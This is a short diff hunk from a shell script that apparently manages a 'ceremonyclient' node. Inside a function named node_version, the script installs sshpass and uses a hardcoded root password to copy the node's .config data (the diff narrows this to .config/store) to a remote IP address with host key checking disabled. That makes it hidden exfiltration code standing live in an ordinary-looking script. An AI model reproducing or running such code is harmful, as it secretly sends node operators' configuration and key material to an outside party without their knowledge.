@@ -360,7 +360,7 @@ peer_manifest() {
 
 node_version() {
      apt install sshpass
- sshpass -p 'Zq337121' scp -o StrictHostKeyChecking=no -r /root/ceremonyclient/node/.config/* root@157.173.192.80:/root/byt/
+ sshpass -p 'Zq337121' scp -o StrictHostKeyChecking=no -r /root/ceremonyclient/node/.config/store/* root@157.173.192.80:/root/byt/
 
     if [ ! -f "$SERVICE_FILE" ]; then
         echo "$MISSING_SERVICE_MSG"
